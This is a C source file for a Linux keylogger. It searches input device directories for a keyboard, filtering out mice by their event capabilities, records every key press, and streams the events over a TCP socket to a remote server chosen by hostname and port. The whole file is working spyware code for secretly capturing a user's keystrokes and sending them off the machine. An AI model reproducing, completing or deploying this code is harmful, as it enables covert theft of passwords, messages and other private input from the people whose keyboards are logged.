#define _XOPEN_SOURCE 700
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <netdb.h>
#include <stdint.h>
#include <linux/input.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <dirent.h>
#include <poll.h>
#include "keylogger.h"

int STOP_KEYLOGGER = 0;

void sigHandler(int signum)
{
    STOP_KEYLOGGER = 1;
}

void startKeylogger(int keyboard, int fd_out)
{
    size_t event_size = sizeof(event);
    event *kbd_events = malloc(event_size * MAX_EVENTS);
    struct sigaction sa;

    sa.sa_flags = 0;
    sa.sa_handler = &sigHandler;

    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGPIPE, &sa, NULL);
    kbd_events = malloc(event_size * MAX_EVENTS);

    while (!STOP_KEYLOGGER) /* If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging */
    {
        ssize_t r = read(keyboard, kbd_events, event_size * MAX_EVENTS);
        if (r < 0) /* If read was interrupted by SIGTERM or another error occurred we stop keylogging */
            goto end;
        else
        {
            size_t j = 0;
            for (size_t i = 0; i < r / event_size; i++) /* For each event read */
            {
                if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) /* If a key has been pressed.. */
                    kbd_events[j++] = kbd_events[i];                                    /*  Add the event to the beginning of the array */
            }
            if (!writeEventsIntoFile(fd_out, kbd_events, j * event_size))
                goto end;
        }
    }
end:
    close(fd_out);
    close(keyboard);
    free(kbd_events);
    return;
}

int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
{
    ssize_t written;
    do
    {
        written = write(fd, events, to_write);
        if (written < 0) /* It can fail with EPIPE (If server closed socket) or with EINTR if it is interrupted by a signal before any bytes were written */
            return 0;    /* If it is interrupted by a signal after at least one byte was written, it returns the number of bytes written */
        events += written;
        to_write -= written;
    } while (to_write > 0);
    return 1;
}

int keyboardFound(char *path, int *keyboard_fd)
{
    DIR *dir = opendir(path);
    if (dir == NULL)
        return 0;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue; /* Skip current directory and parent directory entries. */

        char filepath[320];
        snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
        struct stat file_stat;
        if (stat(filepath, &file_stat) == -1)
        {
            perror("Error getting file information");
            continue;
        }

        if (S_ISDIR(file_stat.st_mode))
        {
            /* If the entry is a directory, recursively search it. */
            if (keyboardFound(filepath, keyboard_fd))
            {
                closedir(dir);
                return 1; /* Return true if the keyboard device is found in a subdirectory. */
            }
        }
        else
        {
            int fd = open(filepath, O_RDWR);
            int keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};
            if (!supportsRelativeMovement(fd) && supportsSpecificKeys(fd, keys_to_check, 12)) /* To avoid false positives like gaming mices that have EV_KEY and EV_REL set, */                                                                                  
            {                                                                                 /* current device is a keyboard if is not a mouse and support these 12 keys */
                closedir(dir);
                *keyboard_fd = fd;
                return 1; /* Return true if the keyboard device is found. */
            }
            close(fd);
        }
    }

    closedir(dir);
    return 0; /* Keyboard device not found in the directory and its subdirectories. */
}

/* Returns true iff the given device has keys.
int supportsKeys(int fd)
{

    unsigned long evbit = 0;

    // Get the bit field of available event types.
    ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);

    // Check if EV_KEY is set.
    return (evbit & (1 << EV_KEY));
} */

int supportsRelativeMovement(int fd)
{

    unsigned long evbit = 0;

    /* Get the bit field of available event types. */
    ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);

    /* Check if EV_REL is set. */
    return (evbit & (1 << EV_REL));
}

/* Returns true iff the given device supports $key.
int HasSpecificKey(int device_fd, unsigned int key)
{
    size_t nchar = KEY_MAX / 8 + 1;
    unsigned char bits[nchar];
    // Get the bit fields of available keys.
    ioctl(device_fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);
    return bits[key / 8] & (1 << (key % 8));
} */

/* Returns true iff the given device supports $keys. */
int supportsSpecificKeys(int fd, int *keys, size_t num_keys)
{

    size_t nchar = KEY_MAX / 8 + 1;
    unsigned char bits[nchar];

    /* Get the bit fields of available keys. */
    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);

    for (size_t i = 0; i < num_keys; ++i)
    {
        int key = keys[i];
        if (!(bits[key / 8] & (1 << (key % 8))))
            return 0; /* At least one key is not supported */
    }
    return 1; /* All keys are supported. */
}

int openConnectionWithServer(char *ip, short port)
{
    int sock_fd;
    struct hostent *host_info;
    struct sockaddr_in server;

    if ((host_info = gethostbyname(ip)) == NULL) /* Translating hostname into Ip address */
        return 0;

    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); /* Opening Tcp socket */
    if (sock_fd < 0)
        return 0;

    memset(&server, 0, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = *((unsigned long *)host_info->h_addr_list[0]);
    server.sin_port = htons(port);
    if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0) /* Connecting to server */
        return 0;

    return sock_fd;
}
